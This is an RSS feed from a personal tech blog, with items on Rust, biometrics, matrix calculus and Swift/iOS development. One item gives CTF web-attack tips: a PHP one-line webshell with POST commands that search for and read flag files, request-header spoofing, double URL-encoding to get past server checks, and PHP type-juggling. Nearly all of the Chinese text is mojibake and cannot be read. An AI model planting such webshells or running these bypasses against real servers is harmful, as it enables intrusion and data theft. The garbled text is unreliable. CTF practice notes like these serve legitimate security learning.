<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Hagemon&#39;s Log</title>
    <link>https://hagemon.github.io/posts/</link>
    <description>Recent content in Posts on Hagemon&#39;s Log</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Hagemon Production</copyright>
    <lastBuildDate>Sun, 17 Oct 2021 15:26:57 +0000</lastBuildDate><atom:link href="https://hagemon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Rust note</title>
      <link>https://hagemon.github.io/posts/rust-note/</link>
      <pubDate>Sun, 17 Oct 2021 15:26:57 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/rust-note/</guid>
      <description>å†…å­˜ç®¡ç† Rustä¸­æ²¡æœ‰åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œé€šè¿‡æ‰€æœ‰æƒå’Œå€Ÿç”¨æ¥ä¿è¯æ•°æ®çš„å†…å­˜å®‰å…¨ã€‚
æ‰€æœ‰æƒ(Ownership) æ‰€æœ‰æƒç³»ç»Ÿåœ¨ç¼–è¯‘æ—¶ä¼šæ£€æŸ¥ä¸€ç»„è§„åˆ™ï¼Œå½“æ»¡è¶³è¿™äº›è§„åˆ™æ—¶æ‰ä¼šé€šè¿‡ç¼–è¯‘ï¼ŒåŒæ—¶èƒ½ä¿è¯ç¨‹åºè¿è¡Œçš„é€Ÿåº¦ã€‚
ä½œç”¨åŸŸç•Œå®šè§„åˆ™ Rustä¸­ä½œç”¨åŸŸç”¨å¤§æ‹¬å·{}è¡¨ç¤ºï¼Œæ— è®ºæ˜¯ifã€elseè¿˜æ˜¯matchï¼Œæˆ–æ˜¯ç›´æ¥çš„{}éƒ½è¡¨ç¤ºä¸€ä¸ªä½œç”¨åŸŸã€‚
// `mascot` is not valid and cannot be used here, because it&amp;#39;s not yet declared. {  let mascot = String::from(&amp;#34;ferris&amp;#34;); // `mascot` is valid from this point forward.  // do stuff with `mascot`. } // this scope is now over, so `mascot` is no longer valid and cannot be used. println!(&amp;#34;{}&amp;#34;, mascot); // this will cause an error. error[E0425]: cannot find value `mascot` in this scope --&amp;gt; src/main.</description>
    </item>
    
    <item>
      <title>Multimodal Biometric Feature Learning Notes</title>
      <link>https://hagemon.github.io/posts/multimodal-biometric-feature-learning-notes/</link>
      <pubDate>Thu, 10 Jun 2021 18:51:25 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/multimodal-biometric-feature-learning-notes/</guid>
      <description>ç”Ÿç‰©è¯†åˆ«å¯ä»¥å®‰å…¨å¿«é€Ÿåœ°é‰´åˆ«ä¸ªä½“ï¼Œå…·ä½“å¯ä»¥é€šè¿‡æŒ‡å…³èŠ‚çº¹ï¼ˆFinger Knuckle Printï¼ŒFKPï¼‰ã€æŒ‡çº¹ï¼ˆFinger Print)ã€æŒçº¹ï¼ˆPalm Printï¼‰ç­‰ã€‚ç”±äºç–«æƒ…å½±å“ï¼ŒFKPè¯†åˆ«æˆä¸ºä¸€ä¸ªä¸æ˜“ä¼ æ’­ç–¾ç—…çš„è¯†åˆ«æ–¹å¼ã€‚
LEARNING DISCRIMINATIVE FINGER-KNUCKLE-PRINT DESCRIPTOR ï¼ˆICASSP 2019ï¼‰æ–¹å‘ä¿¡æ¯(Direction information)æ˜¯è¯†åˆ«FKPå›¾åƒçš„ä¸€ä¸ªå…³é”®ç‰¹å¾ï¼Œå¤§å¤šç°æœ‰çš„æ–¹æ³•ä»ç„¶ä½¿ç”¨è¿™äººå·¥è®¾è®¡çš„ç‰¹å¾ï¼Œè¿™äº›ç‰¹å¾éœ€è¦å¾ˆå¤šçš„å…ˆéªŒçŸ¥è¯†ã€‚è¿™ç¯‡æ–‡ç« ä¸ºFKPçš„ç‰¹å¾å­¦ä¹ ï¼Œæå‡ºäº†ä¸€ç§åŸºäºæ–¹å‘çš„äºŒå€¼ç‰¹å¾å­¦ä¹ æ–¹æ³•(Discriminative Direction Binary Feature Learning, DDBFL)ã€‚ä¸»è¦è´¡çŒ®æœ‰ï¼š
 è®¾è®¡äº†ä¸€ç§åŸºäºGaborè¿‡æ»¤å™¨å·ç§¯çš„ç‰¹å¾Direction Convolution Difference Vector(DCDV) ä½¿ç”¨æŠ•å½±å‡½æ•°å°†ç‰¹å¾äºŒå€¼åŒ–ï¼Œå¹¶ä¿æŒåŒç±»æ ·æœ¬çš„ç´§å¯†æ€§(compact)å’Œå¼‚ç±»æ ·æœ¬çš„å·®å¼‚æ€§(separable) å°†ç‰¹å¾è¿›è¡Œåˆ†å—ç»Ÿè®¡ï¼Œç»„æˆæœ€ç»ˆçš„FKPç‰¹å¾ç®—å­(Feature Descriptor)  Gabor Filter Gaboræ»¤æ³¢å™¨ä½¿ç”¨äº†å›¾åƒé¢‘åŸŸä¸­çš„ä¿¡æ¯æ¥æå–å›¾åƒçš„çº¹ç†ç‰¹å¾ï¼Œç”±ä¸€ä¸ªäºŒç»´é«˜æ–¯å‡½æ•°å’ŒäºŒç»´ä¸‰è§’å‡½æ•°å åŠ è€Œæˆï¼Œæœ¬æ–‡ä½¿ç”¨äº†Gaboræ»¤æ³¢å™¨çš„å®æ•°éƒ¨åˆ†
$$ G(x,y,\theta,\sigma, \beta)=\frac{1}{2\pi \sigma\beta}\exp{-\pi(\frac{x&amp;rsquo;^2}{\sigma^2}+\frac{y&amp;rsquo;^2}{\beta^2})}\cos({2\pi \mu x&amp;rsquo;}) $$
å…¶ä¸­
$$ \begin{aligned} x&amp;rsquo;=(x-x_0)\cos\theta+(y-y_0)\sin\theta \\ y&amp;rsquo;=-(x-x_0)\sin \theta + (y-y_0)\cos \theta \end{aligned} $$
$(x_0,y_0)$ä¸ºæ ¸çš„ä¸­å¿ƒï¼Œ$\mu$æ˜¯å¾„å‘é¢‘ç‡ï¼ˆæˆ‘å–1/3ï¼‰ï¼Œ$\sigma$å’Œ$\beta$ä¸º$x,y$æ ‡å‡†å·®ï¼Œè¿™é‡Œå–1ã€‚
DCDV åœ¨æœ¬æ–‡ä¸­ï¼Œå½“é€‰å®šäº†ä¸€ä¸ªæ–¹å‘$\theta$åï¼Œæ ¹æ®æ ¸çš„å¤§å°ä¾¿å¯ä»¥è®¡ç®—å‡ºæ¯ä¸ªæ–¹å‘çš„Gaboræ ¸ï¼Œå¹¶åœ¨å›¾åƒä¸Šè¿›è¡Œå·ç§¯æ“ä½œï¼Œå¾—åˆ°æ¯ä¸€ä¸ªåƒç´ åœ¨è¯¥æ–¹å‘çš„ç‰¹å¾å€¼ã€‚æœ¬æ–‡ä»$[0,\pi]$é€‰æ‹©äº†12ä¸ªæ–¹å‘ï¼Œä¸ºæ¯ä¸ªåƒç´ è®¡ç®—äº†12ä¸ªç‰¹å¾å€¼ï¼Œå°†12ä¸ªç‰¹å¾å€¼$c_1,c_2,\dots,c_{12}$çš„ç›¸é‚»å·®ç»„æˆå‘é‡ï¼Œå³DCDVï¼š $$DCDV=[c_{12}-c_{11},c_{11}-c_{10},\dots,c_2-c_1,c_1-c_{12}]$$ DCDVå¯ä»¥å¾ˆå¥½çš„è¡¨ç¤ºå›¾åƒä¸­å‡ºç°çš„å¤šä¸ªä¸»è¦æ–¹å‘ç‰¹å¾ï¼Œè‹¥ç›¸é‚»çš„ä¸¤ä¸ªå·ç§¯ç»“æœå¼‚å·ï¼Œè¯´æ˜æ­¤å¤„åŒ…å«ç€æ–¹å‘ä¿¡æ¯ã€‚åŒæ—¶ï¼ŒDCVCçš„å‡å€¼ä¸ºé›¶ï¼Œæ‰€ä»¥ä¸éœ€è¦åšå½’ä¸€åŒ–ã€‚
DDBFL ç‰¹å¾çš„äºŒå€¼è¡¨ç¤ºæ˜¯ä¸€ä¸ªå…·æœ‰é²æ£’æ€§çš„è¡¨ç¤ºæ–¹æ³•ï¼Œè‹¥åŸå§‹ç‰¹å¾å€¼å…·æœ‰ä¸€å®šåŠ¨è¡æ€§ï¼Œå®ƒçš„äºŒå€¼è¡¨ç¤ºè¿˜æ˜¯èƒ½ç›¸å¯¹ç¨³å®šä¸€äº›çš„ï¼Œå¦‚$[0.8,0.9]$çš„åŠ¨è¡ï¼Œåœ¨äºŒå€¼è¡¨ç¤ºåè¿˜æ˜¯ä¼šå½’ä¸º$1$ã€‚æœ¬æ–‡ä½¿ç”¨ä¸€ä¸ªæŠ•å½±çŸ©é˜µ$W\in R^{k\times d}$å°†$d$ç»´çš„DCVCæŠ•å½±è‡³$k$ç»´çš„DDBFLï¼Œå…·ä½“è®¡ç®—å¦‚ä¸‹ï¼š $$b_{p,i,k}=\frac{1}{2}(sgn(w_k^T x_{p,i})+1)$$ è¡¨ç¤ºç¬¬iä¸ªæ ·æœ¬ç¬¬pä¸ªåƒç´ çš„ç¬¬kç»´äºŒå€¼ç‰¹å¾ã€‚
Objective ä¼˜åŒ–ç›®æ ‡ä¸»è¦ä»ä¸¤ä¸ªè§’åº¦ï¼š
 å¢åŠ ç‰¹å¾çš„å·®å¼‚æ€§ï¼Œä½¿ç‰¹å¾ä¹‹é—´é•¿å¾—ä¸ä¸€æ ·ï¼Œæ›´å…·è¾¨è¯†åº¦ï¼Œå³ç‰¹å¾çš„æ–¹å·®æœ€å¤§åŒ–ã€‚ ä½¿åŒç±»æ ·æœ¬æ¥è¿‘ï¼Œå¼‚ç±»æ ·æœ¬è¿œç¦» äºæ˜¯å¯ä»¥å°†ä¼˜åŒ–ç›®æ ‡åˆæ­¥è¡¨ç¤ºä¸ºï¼š  $$ \begin{aligned} \max_{w_k}J(w_k)&amp;amp;=\max_{w_k}J_1(w_k)+2\lambda J_2(w_k) \\ &amp;amp;=\max_{w_k}\sum_{p=1}^P \sum_{i=1}^N ||b_{p,i,k}-\mu_{p,k}||^2 \\ &amp;amp;+2\lambda\sum_{p=1}^P\sum_{i=1}^N (\sum_{j\in \Gamma(i)}||b_{p,i,k}-b_{p,j,k}||^2 -\sum_{j\notin \Gamma(i)}||b_{p,i,k}-b_{p,j,k}||^2 ) \end{aligned} $$</description>
    </item>
    
    <item>
      <title>ç½‘ç»œæ”»é˜²tips</title>
      <link>https://hagemon.github.io/posts/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2tips/</link>
      <pubDate>Thu, 10 Jun 2021 16:50:16 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2tips/</guid>
      <description>è®°å½•ä¸€äº›ç½‘ç»œæ”»é˜²é¢˜ä¸­çš„å°tipsã€‚
Robots æ¯ä¸ªç½‘ç«™æœ‰ä¸€ä¸ªrobots.txtç”¨äºé˜²çˆ¬è™«ã€‚
BPæ„é€ POSTè¯·æ±‚ åœ¨BPä¸­å¯ä»¥åœ¨headeré‡Œæ·»åŠ Content-type: application/x-www-form-urlencodedï¼Œå¹¶åœ¨æœ€åæ·»åŠ å‚æ•°æ„é€ POSTè¯·æ±‚
ä¼ªé€ è¯·æ±‚ åœ¨headerä¸­æ·»åŠ x-forwarded-for: xxx.xxx.xxx.xxxï¼Œä»¥åŠreferer: https://www.google.com æ¥ä¼ªé€ è¯·æ±‚ã€‚
ä¸€å¥è¯æœ¨é©¬ å½“ä¸€å¥è¯æœ¨é©¬åœ¨æœåŠ¡å™¨ä¸Šæ—¶ï¼š
&amp;lt;?php @eval($_POST[&amp;#39;shell&amp;#39;]);?&amp;gt;å°†è¯·æ±‚æ„é€ ä¸ºPOSTï¼Œä¸”å°†å‚æ•°è®¾ç½®ä¸º
shell=system(&amp;#34;find / -name &amp;#39;flag*&amp;#39;&amp;#34;); shell=system(&amp;#39;cat flag.txt&amp;#39;); ?çš„è§£ç  é—®å·çš„URLç¼–ç ä¸º%3fï¼Œæµè§ˆå™¨ä¼šå°†%3fè§£ç ä¸ºé—®å·ã€‚å¦‚æœæœåŠ¡ç«¯å¯¹é—®å·æœ‰ä¸€æ¬¡è§£ç æ ¡éªŒçš„è¿‡ç¨‹ï¼š
&amp;lt;?php url_decode($param); ?&amp;gt;åˆ™å¯ä»¥å…ˆå°†%3fç¼–ç ï¼Œå³%253fã€‚æµè§ˆå™¨ä¼šç°å°†%253fè§£ç ä¸º%3fï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æœåŠ¡ç«¯çš„é—®å·æ ¡éªŒï¼ˆæœåŠ¡ç«¯æ”¶åˆ°çš„å°±æ˜¯%3fè€Œä¸æ˜¯ï¼Ÿï¼‰ã€‚
PHPä¸­çš„æ¯”è¾ƒ PHPä¸­==ä¼šå…ˆå¼ºåˆ¶è½¬åŒ–ç±»å‹å†æ¯”è¾ƒå€¼ï¼Œè€Œ===åˆ™ä¼šæ¯”è¾ƒç±»å‹å’Œå€¼ã€‚
&amp;lt;?php $a = &amp;#39;a1234&amp;#39;; $a == 1234; # åœ¨æ¯”è¾ƒæ—¶ä¼šå»æ‰å­—æ¯ $b = &amp;#39;abc&amp;#39;; $b == 0; # æ¯”è¾ƒæ—¶ä¼šå»æ‰å­—æ¯ &amp;gt; phps phpsæ˜¯phpçš„sourceæ–‡ä»¶ï¼Œå½“æ‰¾ä¸åˆ°phpåœ¨å¹²å˜›çš„æ—¶å€™å¯ä»¥çœ‹ä¸€ä¸‹
æµè§ˆå™¨è§£ç  æµè§ˆå™¨ä¼šå¯¹URLè¿›è¡Œä¸€æ¬¡urldecodeï¼Œå½“æºç ä¼šæ£€éªŒURLæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…ˆå¯¹å‚æ•°è¿›è¡Œé€‚å½“æ¬¡æ•°çš„urlencodeåä¼ å‚ã€‚
å…¶ä¸­açš„ç¼–ç ä¸º%61ï¼Œ1çš„ç¼–ç ä¸º%31ï¼Œè¿™ä¸ªç¼–ç æ˜¯åå…­è¿›åˆ¶æ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚å¦‚æœéœ€è¦å¯¹ç¼–ç å†è¿›è¡Œç¼–ç ï¼Œåˆ™åœ¨å‰é¢åŠ ä¸Š25ï¼Œå¦‚%61çš„ç¼–ç ä¸º%2561ã€‚
ä¹Ÿå¯ä»¥é€šè¿‡å†™ä¸€å°æ®µphpæ¥æŸ¥çœ‹ç¼–ç ï¼š
&amp;lt;?php echo dechex(ord(&amp;#39;a&amp;#39;)); // è¾“å‡º61 &amp;gt; æœ‰æ—¶ä¹Ÿéœ€è¦å¯¹base64è¿›è¡Œè§£ç ï¼š
&amp;lt;?php $str = &amp;#39;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==&amp;#39;; echo base64_decode($str); ?&amp;gt; #åºåˆ—åŒ–å’Œååºåˆ—åŒ–
åœ¨phpä¸­ï¼Œååºåˆ—åŒ–ä¹‹å‰ä¼šæ‰§è¡Œ__wakeupå‡½æ•°ã€‚
åœ¨æˆ‘ä»¬å¯¹ä¸€ä¸ªclassçš„å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–åï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªå½¢å®¹å®ƒçš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ï¼š
&amp;lt;?php class Student{  public $name = &amp;#39;hello&amp;#39;;  public $score = 150;  public $grades = array();   function __wakeup() {  echo &amp;#34;__wakeup is invoked&amp;#34;;  } }  $s = new Student(); var_dump(serialize($s)); ?</description>
    </item>
    
    <item>
      <title>ä¼˜åŒ–é—®é¢˜ä¸­çš„çŸ©é˜µè¿ç®—</title>
      <link>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84%E7%9F%A9%E9%98%B5%E8%BF%90%E7%AE%97/</link>
      <pubDate>Thu, 03 Jun 2021 21:54:00 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84%E7%9F%A9%E9%98%B5%E8%BF%90%E7%AE%97/</guid>
      <description>åœ¨ä¸€äº›éæ·±åº¦å­¦ä¹ çš„æ–¹æ³•ä¸­ï¼Œç›®æ ‡å‡½æ•°ç”±æ ·æœ¬ã€æƒé‡çš„çŸ©é˜µå½¢å¼ç»„æˆã€‚å‡è®¾æ ·æœ¬é›†åˆçŸ©é˜µä¸º$X$ï¼Œæ ·æœ¬å‡å€¼çŸ©é˜µä¸º$M$ï¼Œæƒé‡çŸ©é˜µä¸º$W$ï¼Œæ˜ å°„åçš„ç‰¹å¾ä¸º$W^TX$ï¼Œè¦ä»¤æ˜ å°„åçš„ç‰¹å¾æ–¹å·®æœ€å¤§ï¼Œåˆ™æŸå¤±å‡½æ•°è¡¨ç¤ºä¸ºï¼š
$$\max_{W}||W^TX-W^TM||^2$$
L2 Normä¸çŸ©é˜µçš„è¿¹ ä¼˜åŒ–ç›®æ ‡ä¸­å¸¦æœ‰L2 Normçš„æƒ…å†µä¸‹æ±‚å¯¼è®¡ç®—æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥å°†å…¶è½¬åŒ–ä¸ºçŸ©é˜µçš„è¿¹çš„å½¢å¼ã€‚å‡è®¾æœ‰çŸ©é˜µ$A$ï¼š
$$A=\begin{pmatrix} a_1&amp;amp;a_2&amp;amp;a_3\\ b_1&amp;amp;b_2&amp;amp;b_3\\ c_1&amp;amp;c_2&amp;amp;c_3 \end{pmatrix}$$
åˆ™$A$çš„L2 Normä¸º
$$||A||^2=a_1^2+a_2^2+a_3^2+b_1^2+\cdots+c_3^2$$
è€Œ$A^TA$çš„ä¸»å¯¹è§’çº¿ä¸º
$$A^TA=\begin{pmatrix} a_1^2+a_2^2+a_3&amp;amp;\cdots&amp;amp;\cdots\\ \cdots&amp;amp;b_1^2+b_2^2+b_3&amp;amp;\cdots\\ \cdots&amp;amp;\cdots&amp;amp;c_1^2+c_2^2+c_3 \end{pmatrix}$$
åˆ™å¯ä»¥å°†L2 Normè½¬åŒ–ä¸ºçŸ©é˜µçš„è¿¹å½¢å¼ï¼š
$$||A||^2=trace(A^TA)$$
å¹¶åˆ©ç”¨ä»¥ä¸‹è§„åˆ™æ±‚å¯¼ï¼š
$$\frac{trace(A^TA)}{\partial A}=2A$$
æœ€åä»¤å¯¼æ•°ä¸º0æ¥è®¡ç®—å‚æ•°çŸ©é˜µã€‚</description>
    </item>
    
    <item>
      <title>Swiftå®ç°ç®€å•çš„å›¾åƒç¼“å­˜</title>
      <link>https://hagemon.github.io/posts/swift%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E5%83%8F%E7%BC%93%E5%AD%98/</link>
      <pubDate>Sun, 28 Feb 2021 22:07:38 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/swift%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E5%83%8F%E7%BC%93%E5%AD%98/</guid>
      <description>åœ¨iOS Appä¸­ï¼Œä¸ºäº†å¢åŠ ç”¨æˆ·çš„ä½“éªŒæ„Ÿã€å‡å°‘ç½‘ç»œçš„è¯·æ±‚ã€å¢åŠ Appçš„æ€§èƒ½ï¼Œæˆ‘ä»¬åœ¨è·å–å›¾åƒä¹‹åé€šå¸¸ä¼šå°†å…¶è¿›è¡Œç¼“å­˜ï¼Œæˆ‘å­¦ä¹ äº†ä»é›¶å¼€å§‹æ‰“é€ ä¸€ä¸ªiOSå›¾ç‰‡åŠ è½½æ¡†æ¶ï¼Œå†™äº†ä¸€ä¸ªç®€å•çš„åŸºäºSwiftçš„å›¾åƒç¼“å­˜ã€‚
å›¾ç‰‡åŠ è½½ æˆ‘ä»¬ä»æœ€ç®€å•çš„åœºæ™¯å¼€å§‹ï¼Œåœ¨ViewControllerä¸­å®ç°downloadæ–¹æ³•ï¼Œé€šè¿‡URLSessionä¸‹è½½ä¸€ä¸ªå›¾ç‰‡å¹¶æ˜¾ç¤ºåˆ°ImageViewä¸Šï¼š
func download() {  let url = URL(string: &amp;#34;https://user-gold-cdn.xitu.io/2019/3/25/169b406dfc5fe46e&amp;#34;)  let session = URLSession.shared  let task = session.dataTask(with: url!, completionHandler: { [weak self]  data, res, error in  guard error == nil,  let data = data  else { return }  let image = UIImage(data: data)  guard let strongSelf = self else {return}  DispatchQueue.main.async {  strongSelf.imageView.image = image  }  })  task.</description>
    </item>
    
    <item>
      <title>GCDå¼‚æ­¥æ¸²æŸ“UITableViewCell&#43;æ»šåŠ¨ä¼˜åŒ–</title>
      <link>https://hagemon.github.io/posts/gcd%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93uitableviewcell&#43;%E6%BB%9A%E5%8A%A8%E4%BC%98%E5%8C%96/</link>
      <pubDate>Thu, 25 Feb 2021 22:16:05 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/gcd%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93uitableviewcell&#43;%E6%BB%9A%E5%8A%A8%E4%BC%98%E5%8C%96/</guid>
      <description>åœ¨åŸºäºfeedæµçš„åº”ç”¨ä¸­ï¼Œæœ‰ä¸¤ä¸ªéœ€è¦é‡ç‚¹è§£å†³çš„é—®é¢˜ï¼š
 å¼‚æ­¥è¿›è¡Œè€—æ—¶çš„æ•°æ®åŠ è½½ æ»šåŠ¨æ—¶æ§åˆ¶åŠ è½½ä»»åŠ¡ä»¥ä¿æŒæ»šåŠ¨æµç•…  è®¾å®šä¸€ä¸ªç®€å•çš„åœºæ™¯ï¼š
 åŸºäºUITableViewCell æ¯ä¸ªcelléƒ½æ‹¥æœ‰ä¸€ä¸ªUIImageView åœ¨UIImageViewä¸Šç»˜åˆ¶åœ†è§’å¤´åƒ ç»˜åˆ¶100ä¸ªcellå¹¶è¿›è¡Œé«˜é¢‘ç‡çš„æ»šåŠ¨  æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Instrumentå’ŒXCodeçš„Debuggeré‡Œè§‚å¯Ÿè¿™äº›æŒ‡æ ‡ï¼š
 Average Frame Time æ˜¯å¦ç¦»å±æ¸²æŸ“  ç®€å•å®ç° æœ€ç®€å•çš„å®ç°æ–¹å¼æ˜¯ä¸ºæ¯ä¸€ä¸ªcellä¸Šçš„UIImageViewè®¾ç½®cornerRadiusï¼Œä½†æ˜¯ä¼šå­˜åœ¨ç¦»å±æ¸²æŸ“ï¼Œä¸”AFTå¾ˆé•¿ã€‚ å…¶å®ç°åœ¨ç›´æ¥ç”¨pngå¹¶è®¾ç½®cornerRadiuså¹¶ä¸ä¼šè¢«ç¦»å±æ¸²æŸ“ï¼Œè¿™é‡Œä¸ºäº†å±•ç¤ºæ•ˆæœç‰¹åœ°æŠŠlayeræ …æ ¼åŒ–ä¸€ä¸‹ğŸ˜…
class TableViewController: UITableViewController {   override func viewDidLoad() {  super.viewDidLoad()  }   override func numberOfSections(in tableView: UITableView) -&amp;gt; Int {  return 1  }   override func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&amp;gt; Int {  return 100  }    override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&amp;gt; UITableViewCell {  let cell = tableView.</description>
    </item>
    
    <item>
      <title>Clipin Log 7. æå‡æˆªå±æµç•…åº¦</title>
      <link>https://hagemon.github.io/posts/clipin-post-7/</link>
      <pubDate>Wed, 24 Feb 2021 23:23:36 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/clipin-post-7/</guid>
      <description>æ—§ç‰ˆæœ¬ åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œæˆ‘åœ¨ä¸€ä¸ªClipViewä¸Šå¯¹æš—è‰²èƒŒæ™¯å’Œé«˜äº®åŒºåŸŸç»˜åˆ¶ï¼š
override func draw(_ dirtyRect: NSRect) {   super.draw(dirtyRect)   // Drawing code here.  guard let image = self.image, let drawingRect = self.drawingRect else {  return  }  image.draw(in: self.bounds, operation: .sourceOver, fraction: 0.5) // ç»˜åˆ¶èƒŒæ™¯  var rect = NSIntersectionRect(drawingRect, self.bounds) // å–é«˜äº®åŒºåŸŸå’Œé¡µé¢çš„äº¤é›†åŒºåŸŸ  rect = NSIntegralRect(rect) // åŒºåŸŸå–æ•´ï¼Œä¸ºäº†é˜²æ­¢æŠ–åŠ¨é—®é¢˜   // å–å±å¹•å›¾åƒä¸­é«˜äº®åŒºåŸŸéƒ¨åˆ†æ¸²æŸ“åœ¨viewä¸Šï¼Œä½¿ç”¨.sourceOveræ“ä½œ  // ç”±äºsourceå›¾åƒæ˜¯alphaä¸º1ï¼Œæ‰€ä»¥æ¸²æŸ“ç»“æœå³æ˜¯åŒºåŸŸå›¾åƒæœ¬èº«  image.draw(in: rect, from: rect, operation: .sourceOver, fraction: 1.</description>
    </item>
    
    <item>
      <title>Swift5ï¼šåŸºäºæ­£åˆ™è¡¨è¾¾å¼å®ç°ç®€å•çš„Markdownå³æ—¶æ¸²æŸ“</title>
      <link>https://hagemon.github.io/posts/swift5%E5%9F%BA%E4%BA%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84markdown%E5%8D%B3%E6%97%B6%E6%B8%B2%E6%9F%93/</link>
      <pubDate>Sat, 13 Feb 2021 23:23:44 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/swift5%E5%9F%BA%E4%BA%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84markdown%E5%8D%B3%E6%97%B6%E6%B8%B2%E6%9F%93/</guid>
      <description>æœ¬æ–‡ä»¥iOSä¸‹çš„UITextViewä¸ºä¾‹ï¼Œåœ¨MacOSä¸Šåªè¦æ›´æ”¹NSTextViewçš„ç›¸åº”çš„æ¥å£ååŒæ ·é€‚ç”¨ã€‚
å®ç°æ€è·¯ æˆ‘åœ¨å®ç°è¿‡ç¨‹ä¸­å°è¯•äº†å±€éƒ¨å®æ—¶æ¸²æŸ“å’Œå…¨å±€å®æ—¶æ¸²æŸ“çš„æ–¹å¼ï¼Œç”±äºå­¦è‰ºä¸ç²¾ï¼Œæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°å¾ˆå¥½çš„æ–¹æ³•è¿›è¡Œå±€éƒ¨å®æ—¶æ¸²æŸ“ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹æˆ‘å¯¹äºä¸¤ç§æ–¹æ³•çš„æ€è·¯ã€‚
å±€éƒ¨å®æ—¶æ¸²æŸ“ æœ€æ—©çš„æ€è·¯æ˜¯æ ¹æ®ç”¨æˆ·çš„è¾“å…¥ä½ç½®å¯¹åº”çš„æ®µè½ï¼Œæ›´æ–°NSMutableAttributedStringï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š
 ç›‘å¬textViewDidChange æ‰¾åˆ°å…‰æ ‡å¯¹åº”çš„æ®µè½ æ ¹æ®æ®µè½å†…å®¹ï¼ŒåŸºäºæ­£åˆ™è¡¨è¾¾å¼åˆ†æå¹¶å¯¹åº”æ–‡å­—çš„attribute  ä½†æ˜¯æŒ‰ç…§è¿™ç§æ€è·¯ï¼Œåœ¨æ›¿æ¢æ–‡å­—æ˜¯ä¼šå¯¼è‡´attributeçš„æ··ä¹±ã€‚attributeçš„å½¢å¼æ˜¯å±æ€§:Rangeçš„å½¢å¼ï¼Œåœ¨æ›´æ–°äº†æ–‡æœ¬ä»¥åï¼Œæ‰€æœ‰çš„æ–‡æœ¬rangeä½ç½®éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚æˆ‘æš‚æ—¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ–¹ä¾¿çš„æ–¹æ³•æ¥å±€éƒ¨æ›´æ–°NSMutableAttributedStringçš„å±æ€§ã€‚
å…¨å±€å®æ—¶æ¸²æŸ“ å…¨å±€å®æ—¶æ¸²æŸ“æŒ‡åœ¨ç›‘å¬æ–‡æœ¬å˜åŒ–åæ›´æ–°æ•´ä¸ªæ–‡æœ¬çš„attributeï¼Œè¿™æ ·ä¼šå¸¦æ¥ä¸€äº›æ€§èƒ½çš„æŸå¤±ï¼Œä½†æ˜¯æ›´æ˜“äºå®ç°ã€‚ä¸»è¦çš„æ€è·¯å¦‚ä¸‹ï¼š
 ç›‘å¬textViewDidChange é‡æ–°è§£ææ‰€æœ‰æ–‡å­—çš„attributeå¹¶æ›´æ–°  æˆ‘ä»¬é¦–å…ˆéœ€è¦å°è£…ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å·¥å…·REã€‚
æ­£åˆ™è¡¨è¾¾å¼å·¥å…·RE REçš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š
 åŒ¹é…å¹¶è·å–Regexå¯¹åº”çš„å†…å®¹ æ›¿æ¢Regexæ‰€åŒ¹é…çš„å†…å®¹ åŒ¹é…å¹¶è·å–Regexå¯¹åº”çš„å†…å®¹åŠå…¶èŒƒå›´(NSRange)  é¦–å…ˆå°è£…ä¸€ä¸ªREè¿”å›çš„ç»“æ„ä½“
struct Parsed {  var content: String  var range: NSRange } class RE: NSObject {  static func regularExpression(validateString:String, inRegex regex:String) -&amp;gt; [String]{  // åŒ¹é…å¹¶è·å–å†…å®¹  do {  let re: NSRegularExpression = try NSRegularExpression(pattern: regex, options: [])  let matches = re.</description>
    </item>
    
    <item>
      <title>å®ç°åŸºäºLRUçš„Cache</title>
      <link>https://hagemon.github.io/posts/%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8Elru%E7%9A%84cache/</link>
